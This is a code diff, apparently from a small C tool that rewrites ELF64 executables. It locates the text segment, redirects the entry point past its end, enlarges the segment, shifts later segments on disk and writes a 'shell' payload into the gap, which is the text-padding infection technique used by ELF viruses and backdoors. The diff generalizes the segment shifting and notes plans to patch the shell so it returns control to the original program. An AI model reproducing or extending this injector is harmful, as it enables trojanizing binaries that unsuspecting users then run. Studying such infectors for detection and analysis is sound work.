@@ -13,7 +13,8 @@
 
 // TODO: move forward by the necessary number of pages, not just one
 // TODO: perserve the sections
-// TODO: don't make so many assumptions about what segments other than the text segment exist
+// TODO: make the shell path a parameter
+// TODO: patch the shell to return to the right place
 
 static long long page_size = 0x1000;
 static unsigned shell_size;
@@ -70,7 +71,6 @@ typedef struct {
   long long phdr_offset;
   short phdr_num;
   long long text_end;
-  long long data_end;
   long long alignment_padding;
 } processing_state;
 
@@ -109,7 +109,7 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
   }
   // we haven't finished reading phdr, so we read more of phdr
   else if (ps->read_bytes < phdr_end) {
-    printf("---");
+    fprintf(stderr, "---");
 
     // figure out which phdr we are on
     int current_phdr = (ps->read_bytes - sizeof(ps->ehdr)) / sizeof(Elf64_External_Phdr);
@@ -121,7 +121,7 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
     consumed_bytes = min(len, sizeof(Elf64_External_Phdr) - bytes_read_already);
     memcpy(&ps->phdr[current_phdr], buff, consumed_bytes);
 
-    printf("current_phdr: %d\n", current_phdr);
+    fprintf(stderr, "current_phdr: %d\n", current_phdr);
 
     // we have read a full phdr
     if (bytes_read_already + consumed_bytes == sizeof(Elf64_External_Phdr)) {
@@ -132,8 +132,6 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
         // 1. find the text and data segments
 
         int text_seg = -1;
-        int data_seg = -1;
-        int dynamic_seg = -1;
         int i;
         for (i = 0; i < ps->phdr_num; i++) {
           // text segment is of type LOAD and is executable
@@ -142,23 +140,11 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
           memcpy(&p_flags, ps->phdr[i].p_flags, sizeof(ps->phdr[i].p_flags));
           if (text_seg == -1 && p_type == PT_LOAD && (p_flags & PF_X) != 0) {
             text_seg = i;
-          } else {
-            // data segment is of type LOAD and is after the text segment
-            if (p_type == PT_LOAD) {
-              data_seg = i;
-            } else if (p_type == PT_DYNAMIC) {
-              dynamic_seg = i;
-            }
+            break;
           }
         }
         if (text_seg == -1) {
           return -1;
-        }
-        if (data_seg == -1) {
-          return -2;
-        }
-        if (dynamic_seg == -1) {
-          return -3;
         }
 
         // 2. change the entry point in the header to be after the end of the text segment
@@ -175,35 +161,27 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
         memcpy(&ps->phdr[text_seg].p_filesz, &text_newsz, sizeof(ps->phdr[text_seg].p_filesz));
         memcpy(&ps->phdr[text_seg].p_memsz, &text_newsz, sizeof(ps->phdr[text_seg].p_memsz));
 
-        // 4. move the data segment forward by a page only on disk
+        // 4. all next segments forward by a page only on disk
         // XXX: assume filesz == memsz
-        long long data_off, data_new_off;
-        memcpy(&data_off, &ps->phdr[data_seg].p_offset, sizeof(ps->phdr[data_seg].p_offset));
-        data_new_off = data_off + page_size;
-        memcpy(&ps->phdr[data_seg].p_offset, &data_new_off, sizeof(ps->phdr[data_seg].p_offset));
+        for (i = text_seg; i < ps->phdr_num; i++) {
+          long long data_off, data_new_off;
+          memcpy(&data_off, &ps->phdr[i].p_offset, sizeof(ps->phdr[i].p_offset));
+          if (data_off > text_off + text_filesz) {
+            data_new_off = data_off + page_size;
+            memcpy(&ps->phdr[i].p_offset, &data_new_off, sizeof(ps->phdr[i].p_offset));
+          }
+        }
 
-        // 5. move the dynamic segment forward by a page only on disk
-        // XXX: assume filesz == memsz
-        long long dynamic_off, dynamic_new_off;
-        memcpy(&dynamic_off, &ps->phdr[dynamic_seg].p_offset, sizeof(ps->phdr[dynamic_seg].p_offset));
-        dynamic_new_off = dynamic_off + page_size;
-        memcpy(&ps->phdr[dynamic_seg].p_offset, &dynamic_new_off, sizeof(ps->phdr[dynamic_seg].p_offset));
-
-        // 6. remember where each section ends so that we can send the right amount of data
-        long long data_filesz;
-        memcpy(&data_filesz, &ps->phdr[data_seg].p_filesz, sizeof(ps->phdr[data_seg].p_filesz));
-
+        // 5. remember where the text segment ends so that we can insert the shell there
         ps->text_end = text_off + text_filesz;
-        ps->data_end = data_off + data_filesz;
+
         // XXX: we don't we need this?
         ps->alignment_padding = 0;//data_off - text_off + text_filesz;
         fprintf(stderr, "%d\n", text_off);
-        fprintf(stderr, "%d\n", data_off);
         fprintf(stderr, "%d\n", ps->alignment_padding);
         fprintf(stderr, "%d\n", ps->text_end);
-        fprintf(stderr, "%d\n", ps->data_end);
 
-        // 7. start sending the ehdr and phdr
+        // 6. start sending the ehdr and phdr
         fprintf(stderr, "start sending...\n");
         // TODO: retry writes if we have to / error checking
         write(out_fd, &ps->ehdr, sizeof(ps->ehdr));
@@ -229,9 +207,9 @@ int handle_bytes(processing_state *ps, unsigned char *buff, int len, int out_fd)
           write(out_fd, null, 1);
         }
       }
-    } else if (ps->read_bytes < ps->data_end) {
-    fprintf(stderr, "+++\n");
-      consumed_bytes = min(len, ps->data_end - ps->read_bytes);
+    } else if (len > 0) {
+      fprintf(stderr, "+++\n");
+      consumed_bytes = len;
       // TODO: retry writes if we have to / error checking
       write(out_fd, buff, consumed_bytes);
     } else {
